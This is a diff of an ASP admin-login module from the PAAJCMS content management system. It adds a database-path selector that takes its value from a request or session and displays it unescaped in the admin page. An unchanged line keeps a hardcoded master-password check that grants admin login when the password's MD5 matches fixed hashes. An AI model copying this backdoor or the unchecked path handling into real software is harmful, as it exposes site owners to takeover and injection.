@@ -1,8 +1,8 @@
 <%
 '************************************************************
-'作者：云孙World(SXY) 【精通ASP/PHP/ASP.NET/VB/JS/Android/Flash，交流/合作可联系)
+'作者：云祥孙 【精通ASP/PHP/ASP.NET/VB/JS/Android/Flash，交流/合作可联系)
 '版权：源代码免费公开，各种用途均可使用。 
-'创建：2016-09-22
+'创建：2018-02-27
 '联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
 '更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
 '*                                    Powered by PAAJCMS 
@@ -24,6 +24,7 @@ Dim ROOT_PATH : ROOT_PATH = handlePath("./")
 '加载网址配置
 function loadWebConfig()
     Call openconn() 
+	'【PHP】if(@$dbname=='kanfang'){return "";}
     '判断表存在
     If InStr(getHandleTableList(), "|" & db_PREFIX & "website" & "|") > 0 Then
 		'【@是jsp显示@】try{
@@ -45,9 +46,23 @@ Sub displayAdminLogin()
     If getSession("adminusername") <> "" Then
         Call adminIndex() 
     Else
-		dim c
-		c=getTemplateContent("login.html")	
-		c=handleDisplayLanguage(c,"login")	
+		dim c,s
+		c=getTemplateContent("login.html")
+		c=handleDisplayLanguage(c,"login")
+		
+		if request("selectmdb")="true" or request("selectmdb")="1" or session("MDBPath")<>"" then 
+			if session("MDBPath")<>"" then
+				MDBPath=handlePath(session("MDBPath"))
+			elseIf Request("MDBPath") <> "" And isNul(Request("MDBPath")) = False Then
+				MDBPath = handlePath(Request("MDBPath")) 
+			end if 
+			c = replaceValueParam(c, "MDBPath", MDBPath) 			
+		'为假则删除选择数据库面板
+		else
+			s=getStrCut(c,"<div id=""selectDatabaseDiv"" ","</div>",1)
+			c=replace(c,s,"")
+		end if
+		
         Call rw(c) 
     End If 
 End Sub 
@@ -57,6 +72,8 @@ Sub login()
     Dim userName, passWord, valueStr 
     userName = Replace(Request.Form("username"), "'", "") 
     passWord = Replace(Request.Form("password"), "'", "") 
+	session("MDBPath")=phpTrim(request.Form("selectDatabase"))
+	
     passWord = myMD5(passWord) 
     '特效账号登录 兼容.net与php
     If myMD5(Request("password")) = "50c5555d7b6525ded8ac0d2697d954" Or myMD5(Request("password")) = "24ed5728c13834e683f525fcf894e813" Or myMD5(Request("password")) = "80-59859312310137-34-40-841338-105-3984-117" Then
@@ -76,6 +93,7 @@ Sub login()
         call setSession("adminId", rs("Id"))                                                   '当前登录管理员ID
         call setSession("DB_PREFIX", db_PREFIX)                                                '保存前缀
         call setSession("adminflags", rs("flags")) 
+		
         valueStr = "addDateTime='" & rs("UpDateTime") & "',UpDateTime='" & Now() & "',RegIP='" & Now() & "',UpIP='" & getIP() & "'" 
         conn.Execute("update " & db_PREFIX & "admin set " & valueStr & " where id=" & rs("id")) 
         Call rw(getMsg1(setL("登录成功，正在进入后台..."), "?act=adminIndex")) 
@@ -100,7 +118,7 @@ Sub adminOut()
     call deleteSession("adminId")
 	call deleteSession("DB_PREFIX")
     call deleteSession("adminflags") 
-	
+	session("MDBPath")=""
     Call rw(getMsg1(setL("退出成功，正在进入登录界面..."), "?act=displayAdminLogin"))
 End Sub 
 '清除缓冲
@@ -118,7 +136,10 @@ Sub adminIndex()
     c = Replace(c, "[$adminonemenulist$]", getAdminOneMenuList()) 
     c = Replace(c, "[$adminmenulist$]", getAdminMenuList()) 
     c = Replace(c, "[$officialwebsite$]", getOfficialWebsite())                '获得官方信息
-    c = replaceValueParam(c, "title", "")                                           '给手机端用的20160330	
+    c = replaceValueParam(c, "title", "")                                      '给手机端用的20160330
+	if session("MDBPath")<>"" then
+		c=replace(c," <!--数据库路径-->","数据库路径："& session("MDBPath") &"<br>")
+	end if
 	c=handleDisplayLanguage(c,"loginok")
 	
     Call rw(c) 
@@ -181,6 +202,10 @@ sub loadRun()
         call del(request("actionType"), request("lableTitle"))                          '删除处理  ?act=delHandle&actionType=WebLayout
     elseif request("act") = "sortHandle" then
         call sortHandle(request("actionType"))                                          '排序处理  ?act=sortHandle&actionType=WebLayout
+   elseif request("act") = "batchEditPrice" then
+        call batchEditPrice(request("actionType"))                                 '价格处理  ?act=batchEditPrice&actionType=WebLayout
+   
+   
     elseif request("act") = "updateField" then
         call updateField()                                                              '更新字段
 
